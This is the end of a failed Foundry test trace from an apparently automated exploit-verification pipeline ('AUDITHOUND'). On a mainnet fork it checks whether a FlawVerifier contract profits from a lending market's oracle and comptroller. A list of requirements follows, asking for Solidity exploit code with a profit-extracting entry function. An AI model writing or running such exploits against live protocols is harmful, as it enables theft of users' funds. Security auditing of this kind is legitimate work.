    │   │   └─ ← [Return] 0x7713DD9Ca933848F6819F38B8352D9A15EA73F67, 0x956F47F50A910163D8BF957Cf5846D573E7f87CA, 0x58c46f3a00a69ae5a5ce163895c14f8f5b7791333af9fe6e7a73618cb5460913, 1000000000000000000 [1e18], 2, 0, 0x2028D7Ef0223C45caDBF05E13F1823c1228012BF, 0xDe2Fa230d4C05ec0337D7b4fc10e16f5663044B0, 10000000000000000 [1e16], false
    │   ├─ [2449] 0x7713DD9Ca933848F6819F38B8352D9A15EA73F67::comptroller() [staticcall]
    │   │   └─ ← [Return] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B
    │   ├─ [1118] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::oracle() [staticcall]
    │   │   ├─ [450] 0xBafE01ff935C7305907c33BF824352eE5979B526::oracle() [delegatecall]
    │   │   │   └─ ← [Return] 0x50ce56A3239671Ab62f185704Caedf626352741e
    │   │   └─ ← [Return] 0x50ce56A3239671Ab62f185704Caedf626352741e
    │   ├─ [7505] 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B::markets(0x7713DD9Ca933848F6819F38B8352D9A15EA73F67) [staticcall]
    │   │   ├─ [6810] 0xBafE01ff935C7305907c33BF824352eE5979B526::markets(0x7713DD9Ca933848F6819F38B8352D9A15EA73F67) [delegatecall]
    │   │   │   └─ ← [Return] true, 0, false
    │   │   └─ ← [Return] true, 0, false
    │   ├─ [5826] 0x50ce56A3239671Ab62f185704Caedf626352741e::getUnderlyingPrice(0x7713DD9Ca933848F6819F38B8352D9A15EA73F67) [staticcall]
    │   │   └─ ← [Return] 1001094000000000000 [1.001e18]
    │   ├─ [575] 0x50ce56A3239671Ab62f185704Caedf626352741e::prices(0x58c46f3a00a69ae5a5ce163895c14f8f5b7791333af9fe6e7a73618cb5460913) [staticcall]
    │   │   └─ ← [Return] 1001094 [1.001e6], false
    │   └─ ← [Stop]
    ├─ [409] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [430] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 19290920 [1.929e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 32.32s (23.75s CPU time)

Ran 1 test suite in 32.33s (32.32s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 753742)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
